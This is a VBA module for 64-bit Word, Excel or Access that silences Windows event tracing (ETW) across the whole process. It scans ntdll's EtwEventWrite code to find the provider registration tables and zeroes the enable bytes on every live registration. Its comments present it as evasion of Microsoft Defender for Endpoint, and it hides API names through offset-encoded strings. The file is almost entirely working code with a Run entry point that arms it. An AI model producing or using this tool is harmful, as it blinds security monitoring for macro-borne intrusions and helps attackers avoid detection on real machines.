Attribute VB_Name = "EvtCtx"
Option Explicit

' User-mode ETW silencer for Word/Excel/Access (64-bit Office).
' Requires: WinAPI_Core.bas imported into the same VBA project.
' Paste into a standard module.
'
' Technique: every manifest-based ETW event a process emits funnels through the
' provider registration entries ntdll keeps in per-process slot tables. Each
' entry carries two cached enable bytes that gate the two write paths (session
' submission via NtTraceEvent, and private trace buffers). This module locates
' the slot table and counts arrays by scanning the event-write function's code
' for the instructions that reference them, validates the discovery against a
' probe provider registration it creates and destroys itself, then clears the
' two enable bytes on every live registration. Events then return success
' without being written or submitted, process-wide.
'
' No code is modified anywhere: the writes are single bytes into ntdll heap
' registration entries (already RW). See README.md for what this does and does
' not cover against Microsoft Defender for Endpoint.
'
' The module carries no sensitive literals: names are rebuilt at runtime from
' offset numeric arrays. The two ntdll registration APIs are declared by name
' (they are ordinary telemetry APIs, not evasion indicators).

' ===================== CONSTANTS =====================

Private Const OFF_SESS As Long = &H74       ' RegEntry: session-path enable byte
Private Const OFF_PRIV As Long = &HEC       ' RegEntry: private-buffer enable byte
Private Const OFF_TOKEN As Long = &H54      ' RegEntry: handle token (word)

Private Const SCN_MEM_EXECUTE As Long = &H20000000
Private Const SCN_MEM_WRITE As Long = &H80000000
Private Const MAX_SCAN_BYTES As Long = 4194304
Private Const PROBE_WINDOW As Long = &H120  ' bytes of EtwEventWrite prologue scanned
Private Const MAX_SAVED As Long = 512
Private Const MAX_SANE_COUNT As Long = 1024

' ===================== DECLARES =====================
' GetModuleHandleW, LoadLibraryW, GetProcAddress, CopyMemory come from WinAPI_Core.bas
Private Declare PtrSafe Function VirtualQuery Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, ByVal lpBuffer As LongPtr, _
    ByVal dwLength As LongPtr) As LongPtr
Private Declare PtrSafe Function EtwEventRegister Lib "ntdll" ( _
    ByVal ProviderId As LongPtr, ByVal EnableCallback As LongPtr, _
    ByVal CallbackContext As LongPtr, ByRef RegHandle As LongPtr) As Long
Private Declare PtrSafe Function EtwEventUnregister Lib "ntdll" ( _
    ByVal RegHandle As LongPtr) As Long

' ===================== STATE =====================

Private mEntry(0 To MAX_SAVED - 1) As LongPtr   ' blinded registration entries
Private mOldSess(0 To MAX_SAVED - 1) As Byte    ' original enable bytes
Private mOldPriv(0 To MAX_SAVED - 1) As Byte
Private mCount As Long
Private mState As String                        ' idle | silenced | failed

' ===================== POINTER HELPERS =====================

Private Function RdPtr(ByVal p As LongPtr) As LongPtr
    Dim v As LongPtr
    If p <> 0 Then CopyMemory VarPtr(v), p, 8
    RdPtr = v
End Function

Private Function RdDw(ByVal p As LongPtr) As Long
    Dim v As Long
    If p <> 0 Then CopyMemory VarPtr(v), p, 4
    RdDw = v
End Function

Private Function RdWd(ByVal p As LongPtr) As Integer
    Dim v As Integer
    If p <> 0 Then CopyMemory VarPtr(v), p, 2
    RdWd = v
End Function

Private Function RdByte(ByVal p As LongPtr) As Byte
    Dim v As Byte
    If p <> 0 Then CopyMemory VarPtr(v), p, 1
    RdByte = v
End Function

' Committed-and-readable check so speculative pointer chasing can never fault
Private Function SafePtr(ByVal p As LongPtr, ByVal n As Long) As Boolean
    Dim mbi(0 To 59) As Byte
    If p = 0 Then Exit Function
    If VirtualQuery(p, VarPtr(mbi(0)), 48) = 0 Then Exit Function
    ' MEMORY_BASIC_INFORMATION x64: State @ +0x20, Protect @ +0x24
    Dim st As Long, pr As Long
    st = RdDw(VarPtr(mbi(0)) + &H20)
    pr = RdDw(VarPtr(mbi(0)) + &H24)
    If st <> &H1000 Then Exit Function                 ' MEM_COMMIT
    If pr = &H1 Or pr = &H100 Then Exit Function       ' PAGE_NOACCESS / GUARD
    SafePtr = True
End Function

Private Sub WrByte(ByVal p As LongPtr, ByVal v As Byte)
    If p <> 0 Then CopyMemory p, VarPtr(v), 1
End Sub

' ===================== STRING DECODER =====================

Private Function Ds(ByVal e As Variant, ByVal o As Long) As String
    Dim i As Long, s As String
    For i = LBound(e) To UBound(e)
        s = s & ChrW$(e(i) - o)
    Next i
    Ds = s
End Function

' ===================== PE WALKER =====================
' Returns the end address (base + max section end) of the module image so all
' discovery reads stay inside mapped memory.

Private Function ImageSpan(ByVal base As LongPtr, ByRef pEnd As LongPtr) As Boolean
    Dim e_lfanew As Long, n As Integer, optSize As Integer
    Dim secOff As LongPtr, i As Long, va As Long, vsz As Long
    Dim hi As LongPtr

    If base = 0 Then Exit Function
    If RdDw(base) <> &H905A4D Then Exit Function
    e_lfanew = RdDw(base + &H3C)
    If RdDw(base + e_lfanew) <> &H4550 Then Exit Function

    n = RdWd(base + e_lfanew + 6)
    optSize = RdWd(base + e_lfanew + 20)
    secOff = base + e_lfanew + 24 + optSize

    For i = 0 To n - 1
        va = RdDw(secOff + i * 40 + 12)
        vsz = RdDw(secOff + i * 40 + 8)
        If va <> 0 And vsz > 0 Then
            If base + va + vsz > hi Then hi = base + va + vsz
        End If
    Next i
    pEnd = hi
    ImageSpan = (hi > base)
End Function

' ===================== DISCOVERY =====================
' Registers a probe provider, decodes its handle into (bucket, index, token),
' scans the event-write prologue for instructions referencing the slot table
' and the counts array (imagebase-relative or RIP-relative forms), and accepts
' a candidate only if the probe's own entry validates through it.

Private Function Discover(ByRef pTable As LongPtr, ByRef pCounts As LongPtr) As Boolean
    Dim hNt As LongPtr, imgEnd As LongPtr, funcWrite As LongPtr
    Dim g(0 To 15) As Byte
    Dim hReg As LongPtr, st As Long
    Dim bucket As Long, probeIdx As Long, token As Integer
    Dim code() As Byte, i As Long, d As Long
    Dim tTgt As LongPtr, cTgt As LongPtr
    Dim arr As LongPtr, e As LongPtr

    hNt = GetModuleHandleW(StrPtr(Ds(Array(113, 119, 103, 111, 111, 49, 103, 111, 111), 3)))
    If hNt = 0 Then Exit Function
    If Not ImageSpan(hNt, imgEnd) Then Exit Function

    funcWrite = GetProcAddress(hNt, Ds(Array(72, 119, 122, 72, 121, 104, 113, 119, 90, 117, 108, 119, 104), 3))
    If funcWrite = 0 Then Exit Function

    ' probe registration (research GUID, never written to)
    g(0) = &H6E: g(1) = &H1F: g(2) = &H2A: g(3) = &H90
    g(4) = &H7C: g(5) = &H4B: g(6) = &H4D: g(7) = &H35
    g(8) = &H9A: g(9) = &H18: g(10) = &HB5: g(11) = &H2D
    g(12) = &HF: g(13) = &H3E: g(14) = &H11: g(15) = &HC7
    st = EtwEventRegister(VarPtr(g(0)), 0, 0, hReg)
    If st <> 0 Or hReg = 0 Then Exit Function
    If (hReg And 1) = 0 Then EtwEventUnregister hReg: Exit Function

    Dim lowDw As Long
    CopyMemory VarPtr(lowDw), VarPtr(hReg), 4
    bucket = (lowDw \ 2) And 7
    probeIdx = (lowDw And &HFFFFFFF0&) \ 16
    token = RdWd(VarPtr(hReg) + 4) And &HFFFF&

    ReDim code(0 To PROBE_WINDOW - 1)
    CopyMemory VarPtr(code(0)), funcWrite, PROBE_WINDOW

    ' scan for disp32-bearing references; prefixes cover the mov-to-register
    ' (slot table) and cmp-eax (counts) encodings seen across builds
    For i = 0 To PROBE_WINDOW - 7
        Dim isTbl As Boolean, isCnt As Boolean, dOff As Long, pfx As Long
        isTbl = False: isCnt = False: dOff = 0: pfx = 0

        If i + 4 <= PROBE_WINDOW Then
            ' imagebase-relative forms: 4C 8B 9C D3 dd (mov r11,[rbx+rdx*8+d])
            If i + 4 < PROBE_WINDOW Then
                If code(i) = &H4C And code(i + 1) = &H8B And code(i + 2) = &H9C And code(i + 3) = &HD3 Then
                    isTbl = True: dOff = i + 4: pfx = 8
                ' cmp eax,[rbx+rdx*4+d]: 3B 84 93 dd
                ElseIf code(i) = &H3B And code(i + 1) = &H84 And code(i + 2) = &H93 Then
                    isCnt = True: dOff = i + 3: pfx = 7
                ' rip forms: 4C 8B 1D dd / 48 8B 05 dd / 4C 8B 05 dd (mov reg,[rip+d])
                ElseIf code(i) = &H4C And code(i + 1) = &H8B And code(i + 2) = &H1D Then
                    isTbl = True: dOff = i + 3: pfx = 7
                ElseIf (code(i) = &H48 Or code(i) = &H4C) And code(i + 1) = &H8B And code(i + 2) = &H5 Then
                    isTbl = True: dOff = i + 3: pfx = 7
                ' cmp eax,[rip+d]: 3B 05 dd
                ElseIf code(i) = &H3B And code(i + 1) = &H5 Then
                    isCnt = True: dOff = i + 2: pfx = 6
                ElseIf code(i) = &H8B And code(i + 1) = &H5 Then
                    isCnt = True: dOff = i + 2: pfx = 6
                End If
            End If
        End If

        If dOff = 0 Or dOff + 4 > PROBE_WINDOW Then GoTo NextI
        d = RdDw(VarPtr(code(dOff)))

        ' candidate targets: imagebase-relative (disp = RVA), and
        ' RIP-relative for the rip-form prefixes
        Dim tgt1 As LongPtr, tgt2 As LongPtr
        tgt1 = hNt + Unsigned(d)
        tgt2 = 0
        If pfx = 7 Or pfx = 6 Then tgt2 = funcWrite + dOff + 4 + d

        If isTbl Then
            If ValidateTable(tgt1, bucket, probeIdx, token, hNt, imgEnd) Then pTable = tgt1
            If pTable = 0 And tgt2 <> 0 Then
                If ValidateTable(tgt2, bucket, probeIdx, token, hNt, imgEnd) Then pTable = tgt2
            End If
        ElseIf isCnt Then
            If ValidateCounts(tgt1, bucket, probeIdx, hNt, imgEnd) Then pCounts = tgt1
            If pCounts = 0 And tgt2 <> 0 Then
                If ValidateCounts(tgt2, bucket, probeIdx, hNt, imgEnd) Then pCounts = tgt2
            End If
        End If

        If pTable <> 0 And pCounts <> 0 Then Exit For
NextI:
    Next i

    EtwEventUnregister hReg
    Discover = (pTable <> 0 And pCounts <> 0)
End Function

Private Function Unsigned(ByVal v As Long) As LongPtr
    ' reinterpret a signed Long as unsigned for RVA arithmetic
    Unsigned = v
    If v < 0 Then Unsigned = Unsigned + 4294967296#
End Function

Private Function ValidateTable(ByVal t As LongPtr, ByVal bucket As Long, _
        ByVal probeIdx As Long, ByVal token As Integer, _
        ByVal hNt As LongPtr, ByVal imgEnd As LongPtr) As Boolean
    Dim arr As LongPtr, e As LongPtr, j As Long, v As LongPtr
    If t <= hNt Or t + 64 > imgEnd Then Exit Function
    If Not SafePtr(t, 64) Then Exit Function

    ' shape: every bucket slot is null or a canonical, 16-aligned heap pointer
    For j = 0 To 7
        v = RdPtr(t + j * 8)
        If v <> 0 Then
            If v < &H10000 Or v >= 140733193013248# Then Exit Function
            If (v And &HF) <> 0 Then Exit Function
        End If
    Next j

    arr = RdPtr(t + bucket * 8)
    If arr = 0 Then Exit Function
    If Not SafePtr(arr + probeIdx * 8, 8) Then Exit Function
    e = RdPtr(arr + probeIdx * 8)
    If e = 0 Or e < &H10000 Or e >= 140733193013248# Then Exit Function
    If (e And 1) <> 0 Then Exit Function
    If Not SafePtr(e + OFF_TOKEN, 2) Then Exit Function
    ValidateTable = (RdWd(e + OFF_TOKEN) = token)
End Function

Private Function ValidateCounts(ByVal c As LongPtr, ByVal bucket As Long, _
        ByVal probeIdx As Long, ByVal hNt As LongPtr, ByVal imgEnd As LongPtr) As Boolean
    Dim n As Long
    If c <= hNt Or c + 32 > imgEnd Then Exit Function
    If Not SafePtr(c, 32) Then Exit Function
    n = RdDw(c + bucket * 4)
    ValidateCounts = (n > probeIdx And n < MAX_SANE_COUNT)
End Function

' ===================== PUBLIC API =====================

Public Function Arm() As Boolean
    #If Win64 Then
        Dim pTable As LongPtr, pCounts As LongPtr
        Dim b As Long, i As Long, cnt As Long
        Dim arr As LongPtr, e As LongPtr

        If mCount > 0 Then
            Arm = True
            Exit Function
        End If
        mState = "failed"

        If Not Discover(pTable, pCounts) Then
            Debug.Print "[!] registration table discovery failed"
            Exit Function
        End If

        For b = 0 To 7
            arr = RdPtr(pTable + b * 8)
            If arr <> 0 And arr > &H10000 Then
                cnt = RdDw(pCounts + b * 4)
                If cnt < 0 Or cnt > MAX_SANE_COUNT Then cnt = 0
                If Not SafePtr(arr, cnt * 8 + 8) Then cnt = 0
                For i = 0 To cnt - 1
                    e = RdPtr(arr + i * 8)
                    If e > &H10000 And e < 140733193013248# And (e And 1) = 0 Then
                        If SafePtr(e, &H100) Then
                        If mCount < MAX_SAVED Then
                            mEntry(mCount) = e
                            mOldSess(mCount) = RdByte(e + OFF_SESS)
                            mOldPriv(mCount) = RdByte(e + OFF_PRIV)
                            WrByte e + OFF_SESS, 0
                            WrByte e + OFF_PRIV, 0
                            mCount = mCount + 1
                        End If
                        End If
                    End If
                Next i
            End If
        Next b

        If mCount = 0 Then
            mState = "inactive (no live registrations)"
            Arm = True
            Exit Function
        End If

        ' read back: every saved entry must hold two zeroed gates
        For i = 0 To mCount - 1
            If RdByte(mEntry(i) + OFF_SESS) <> 0 Or RdByte(mEntry(i) + OFF_PRIV) <> 0 Then
                Debug.Print "[!] verify failed at " & Hex(mEntry(i))
                Disarm
                Exit Function
            End If
        Next i

        mState = "silenced"
        Arm = True
    #Else
        Debug.Print "[!] 64-bit Office required"
    #End If
End Function

Public Function Disarm() As Boolean
    #If Win64 Then
        Dim i As Long
        For i = 0 To mCount - 1
            WrByte mEntry(i) + OFF_SESS, mOldSess(i)
            WrByte mEntry(i) + OFF_PRIV, mOldPriv(i)
        Next i
        mCount = 0
        mState = "idle"
        Disarm = True
    #End If
End Function

Public Function GetState() As String
    GetState = mState
End Function

Public Function GetCount() As Long
    GetCount = mCount
End Function

Public Function GetEntry(ByVal i As Long) As LongPtr
    If i >= 0 And i < mCount Then GetEntry = mEntry(i)
End Function

' ===================== ENTRY POINT =====================

Public Sub Run()
    #If Win64 Then
        If Arm() Then
            MsgBox "User-mode telemetry: " & mState & vbCrLf & _
                   "Registrations silenced: " & mCount, vbInformation, "EvtCtx"
        Else
            MsgBox "Silencing failed - Ctrl+G for details", vbExclamation, "EvtCtx"
        End If
    #Else
        MsgBox "Requires 64-bit Office", vbExclamation, "EvtCtx"
    #End If
End Sub
